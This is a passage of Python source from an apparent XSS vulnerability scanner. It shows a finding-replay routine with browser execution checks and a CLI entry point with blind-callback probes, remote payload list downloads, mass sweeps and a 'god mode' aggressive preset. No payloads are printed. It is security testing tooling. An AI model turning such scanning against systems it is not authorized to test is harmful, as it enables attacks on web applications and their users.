    item, report_path, error = load_replay_finding(args)
    if item is None:
        console.error(error)
        return 1
    method, url, headers, body = _replay_request_args(item)
    if not url:
        console.error("The selected finding has no reproducible URL or curl PoC")
        return 1

    payload = str(item.get("payload") or "")
    token = _replay_token(payload)
    user_headers = XSSScanner._parse_headers(getattr(args, "headers", None))
    user_cookies = XSSScanner._parse_cookies(getattr(args, "cookies", None), getattr(args, "cookie_file", None))
    headers.update(user_headers)

    console.rule("replay")
    console.info(f"Report: {report_path}")
    console.info(f"Finding: {item.get('finding_id', '?')}  {item.get('kind', '')}")
    console.info(f"Request: {method} {truncate(url, 160)}")
    if body:
        console.info(f"Body: {truncate(body, 200)}", important=False)

    stats = ScanStats(urls_total=1)
    http = HttpEngine(
        console,
        stats,
        headers=user_headers,
        cookies=user_cookies,
        timeout=getattr(args, "timeout", 20.0),
        retries=0,
        rate=0.0,
        concurrency=1,
        proxy=getattr(args, "proxy", None),
        insecure=getattr(args, "insecure", False),
        max_response_bytes=getattr(args, "max_response_bytes", 5 * 1024 * 1024),
        http2=getattr(args, "http2", False),
        impersonate=getattr(args, "impersonate", None),
    )

    response: Optional[HttpResponse] = None
    try:
        await http.start()
        data: Any = None
        json_body: Optional[Dict[str, Any]] = None
        if method not in ("GET", "HEAD") and body:
            stripped = body.lstrip()
            if stripped[:1] in ("{", "["):
                try:
                    json_body = json.loads(body)
                except json.JSONDecodeError:
                    data = body
            elif "=" in stripped:
                data = body
            else:
                data = body
        response = await http.request(
            method,
            url,
            headers=headers or None,
            data=data,
            json_body=json_body,
            allow_redirects=True,
        )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        console.error(f"Replay request failed: {exc}")
        return 1
    finally:
        await http.close()

    if response is None:
        console.error("Replay produced no response")
        return 1
    if response.error:
        console.error(f"Replay request error: {response.error}")
        return 1

    reflected = bool(payload) and payload in (response.text or "")
    info = None
    if reflected:
        info = analyze_reflection(
            response.text, payload, payload, response.header("content-type", "")
        )
    executable = bool(info and info.executable)

    browser_executed = False
    browser_evidence = ""
    browser_attempted = False
    if not getattr(args, "no_browser", False) and getattr(args, "confirm", "auto") != "http":
        browser_attempted = True
        engine = _make_replay_browser(args, console)
        try:
            if await engine.start():
                try:
                    if method in ("GET", "HEAD"):
                        await engine.navigate(url)
                    else:
                        await engine.navigate(str(item.get("url") or url))
                        await engine.submit_form(0, str(item.get("parameter") or ""), payload)
                    hit = await engine.check_token(token, timeout=3.0)
                    if hit:
                        browser_executed = hit.get("executed") == "yes"
                        browser_evidence = str(hit.get("evidence") or "")
                        if hit.get("sink"):
                            browser_evidence = (
                                f"sink={hit.get('sink')}"
                                + (f" at {hit.get('dom_path')}" if hit.get("dom_path") else "")
                                + (f"; {browser_evidence}" if browser_evidence else "")
                            )
                finally:
                    await engine.stop()
        except Exception as exc:
            console.debug(f"Replay browser check failed: {exc}")
    else:
        console.warn("Browser check skipped (--no-browser/--confirm http); HTTP evidence only")

    confirmed = browser_executed or executable
    status = {
        "finding_id": item.get("finding_id", ""),
        "kind": item.get("kind", ""),
        "report": str(report_path),
        "request": {"method": method, "url": url},
        "response_status": response.status or 0,
        "reflected": reflected,
        "executable": executable,
        "browser_attempted": browser_attempted,
        "browser_executed": browser_executed,
        "browser_evidence": browser_evidence,
        "context": info.context if info else "",
        "reproduced": confirmed,
        "confidence": "confirmed" if browser_executed else ("high" if executable else "low"),
    }
    console.event("replay_result", **status)
    console.raw("")
    console.raw(json.dumps(status, indent=2, ensure_ascii=False))
    console.raw("")
    if browser_executed:
        console.ok("Replay confirmed: the payload executed in the browser")
        return 0
    if executable:
        console.ok("Replay reproduced HTTP-level execution evidence (browser not confirmed)")
        return 0
    if reflected:
        console.warn("Replay reflected the payload, but it is not executable in this context")
        return 1
    console.error("Replay did not reproduce the finding")
    return 1


def main(argv: Optional[Sequence[str]] = None) -> int:
    raw_args = list(argv) if argv is not None else sys.argv[1:]
    # Decide about colour before argparse renders --help, so `--no-color --help`
    # is plain even on a TTY.
    if "--no-color" in raw_args or os.environ.get("NO_COLOR"):
        bcolors.disable()
        if _ui is not None:
            _ui.disable()
    parser = build_parser()
    args = parser.parse_args(argv)
    explicit_flags = {token.split("=", 1)[0] for token in raw_args if token.startswith("--")}
    god_mode_requested = "--god" in explicit_flags or "--yolo" in explicit_flags
    if args.ai_only:
        args.ai = True

    if args.profile == "quick" and not god_mode_requested:
        if "--crawl" not in explicit_flags and "--deep" not in explicit_flags:
            args.crawl = False
        if not {"--no-browser", "--browser", "--confirm"}.intersection(explicit_flags):
            args.no_browser = True
        if "--no-remote-payloads" not in explicit_flags and "--remote-payloads" not in explicit_flags:
            args.remote_payloads = False
    elif args.profile == "deep":
        args.deep = True

    if args.no_color or os.environ.get("NO_COLOR"):
        bcolors.disable()
        if _ui is not None:
            _ui.disable()
    if args.list_payloads:
        print_payloads()
        return 0
    if args.list_tampers:
        print_tampers()
        return 0
    if getattr(args, "list_encoders", False):
        print_encoders()
        return 0

    console = Console(
        verbose=args.verbose, quiet=args.quiet, log_file=args.output,
        events_file=getattr(args, "events_jsonl", None),
    )
    if getattr(args, "doctor", False):
        return run_doctor(console, args)
    if not args.quiet:
        banner(console)

    if args.blind:
        if not re.match(r"^https?://", args.blind, re.IGNORECASE):
            console.error("--blind requires an http(s) callback URL, e.g. --blind https://xo.example")
            return 1
        console.info(
            f"Blind XSS: injecting out-of-band probes that call back to {args.blind}",
            important=False,
        )

    if getattr(args, "encoder", None):
        known = set(encoder_names()) if HAS_RECON else set()
        unknown = [name for name in args.encoder if name not in known]
        if unknown:
            console.error(
                "Unknown encoder(s): " + ", ".join(unknown) + ". Run --list-encoders."
            )
            return 1

    if getattr(args, "oob_file", None) and not (args.blind or args.interactsh):
        console.error(
            "--oob-file only reads observed callbacks; pair it with --blind <callback-url> "
            "or use --interactsh for a generated callback."
        )
        return 1

    if getattr(args, "god", False):
        raw_tokens = list(argv) if argv is not None else sys.argv[1:]
        # Normalize `--flag=value` tokens so explicit user settings claim their
        # flag (otherwise god mode would override them).
        user_flags = {
            token.split("=", 1)[0]
            for token in raw_tokens
            if token.startswith("--") and token.split("=", 1)[0] not in ("--god", "--yolo")
        }
        apply_god_preset(args, console, user_flags)
        if _ui is not None and _ui.enabled() and not console.quiet:
            diamond = _ui.glyphs()["diamond"]
            console.raw(
                f"  {bcolors.FAIL}{bcolors.BOLD}{diamond} GOD MODE ENGAGED{bcolors.ENDC}"
                f"{bcolors.DIM}  full-automatic maximum-aggression preset  "
                f"{bcolors.FAIL}{diamond}{bcolors.ENDC}"
            )
        else:
            console.info("GOD MODE engaged: full-automatic maximum-aggression preset applied", important=True)
        console.info(
            f"god preset: crawl depth {args.crawl_depth}/{args.max_urls} URLs/{args.js_files} JS files, "
            f"{args.max_payloads} payloads per point, {args.threads} workers x {args.concurrency} requests, "
            f"browser {'off (HTTP-only)' if args.no_browser else args.browser}, "
            f"OOB {'interactsh' if getattr(args, 'interactsh', None) else ('blind callback' if args.blind else 'off')}",
        )

    recon_flags = (
        getattr(args, "subdomains", False)
        or int(getattr(args, "subdomain_brute", 0) or 0) > 0
        or getattr(args, "passive_urls", False)
        or getattr(args, "openapi", False)
        or getattr(args, "fuzz_paths", False)
        or getattr(args, "mine_params", False)
        or getattr(args, "external_tools", False)
    )
    if recon_flags and not HAS_RECON:
        console.error(
            "Reconnaissance modules failed to import: " + str(globals().get("_RECON_IMPORT_ERROR", "unknown error"))
        )
        return 1

    if not HAS_AIOHTTP:
        console.error("aiohttp is required: pip install -r requirements.txt")
        return 1
    if not HAS_BS4:
        console.error("beautifulsoup4 is required: pip install -r requirements.txt")
        return 1

    if args.no_browser:
        args.confirm = "http"
    if args.threads < 1:
        args.threads = 1
    if args.concurrency < 1:
        args.concurrency = 1
    if args.max_response_bytes < 1024:
        console.warn("--max-response-bytes is below 1024; using 1024 bytes")
        args.max_response_bytes = 1024
    if args.max_payloads < 1:
        args.max_payloads = 1
    if args.crawl_depth < 1:
        args.crawl_depth = 1
    if args.max_urls < 1:
        args.max_urls = 1
    if args.js_files < 0:
        args.js_files = 0
    if args.fuzz_param_limit < 1:
        args.fuzz_param_limit = 1
    if args.subdomain_brute < 0:
        args.subdomain_brute = 0
    if args.oob_interval < 1:
        args.oob_interval = 1.0
    if args.oob_wait < 0:
        args.oob_wait = 0.0

    if args.deep:
        args.crawl = True
        args.crawl_depth = max(args.crawl_depth, 5)
        args.max_urls = max(args.max_urls, 1500)
        args.discover = True
        args.discover_paths = True
        args.fuzz_params = True
        if "--no-path-xss" not in explicit_flags:
            args.path_xss = True

    # Headed vs headless is resolved from the terminal/CI context unless the
    # operator pinned it with --headless or --show-browser.
    resolve_headless(args, explicit_flags)

    if getattr(args, "replay", None):
        install_uvloop()
        try:
            return asyncio.run(run_replay(args, console))
        except KeyboardInterrupt:
            console.warn("Interrupted")
            return 130
        except Exception as exc:
            console.error(f"Replay failed: {exc}")
            if args.verbose:
                console.raw(traceback.format_exc())
            return 1

    if args.mass and getattr(args, "param_audit", False):
        console.error("--mass and --param-audit are separate modes; choose one")
        return 1

    if getattr(args, "god", False) and (args.mass or getattr(args, "param_audit", False)):
        console.error("--god is a full-scan preset; it cannot be combined with --mass or --param-audit")
        return 1

    if getattr(args, "param_audit", False):
        if not HAS_PARAM_AUDIT:
            console.error(
                "Parameter-audit modules failed to import: "
                + str(globals().get("_PARAM_IMPORT_ERROR", "unknown error"))
            )
            return 1
        console.info(
            "Parameter audit: URL harvest + batched GET/JSON reflection probes",
            important=False,
        )
        install_uvloop()
        try:
            code, reflected = asyncio.run(run_param_audit(args, console))
            if args.fail_on_findings and reflected:
                code = 2
        except KeyboardInterrupt:
            console.warn("Interrupted")
            code = 130
        except Exception as exc:
            console.error(f"Fatal error: {exc}")
            if args.verbose:
                console.raw(traceback.format_exc())
            code = 1
        return code

    if args.mass:
        if args.blind:
            console.warn("--blind is ignored in mass mode (HTTP-only sweep)")
        console.info("Mass mode: stateless HTTP sweep (no crawl, browser or reports)", important=False)
        install_uvloop()
        try:
            code, findings = asyncio.run(run_mass(args, console))
            if args.fail_on_findings and findings:
                code = 2
        except KeyboardInterrupt:
            console.warn("Interrupted")
            code = 130
        except Exception as exc:
            console.error(f"Fatal error: {exc}")
            if args.verbose:
                console.raw(traceback.format_exc())
            code = 1
        return code

    if args.jsonl and not args.mass:
        console.warn("--jsonl is only written in --mass mode; full scans use --report json")

    install_uvloop()
    payload_files: List[Path] = []
    payload_dir: Optional[Path] = None
    code = 0
    try:
        if args.remote_payloads:
            sources: List[str] = list(PAYLOAD_SOURCES)
            for extra in args.payload_source or []:
                if extra and extra not in sources:
                    sources.append(str(extra))
            payload_dir = payload_workdir(args.payload_tmp_dir)
            payload_files, payload_dir = download_payload_lists(
                console,
                sources,
                args.payload_limit,
                work_dir=payload_dir,
            )
        args.payload_files = [str(path) for path in payload_files]

        console.start_status()
        code, findings = asyncio.run(run_targets(args, console))
        if args.fail_on_findings and findings:
            code = 2
    except KeyboardInterrupt:
        console.warn("Interrupted - checkpoints were saved")
        code = 130
    except Exception as exc:
        console.error(f"Fatal error: {exc}")
        if args.verbose:
            console.raw(traceback.format_exc())
        code = 1
    finally:
        console.stop_status()
        cleanup_payload_lists(payload_dir, keep=args.keep_payloads, console=console)
    return code


if __name__ == "__main__":
    sys.exit(main())
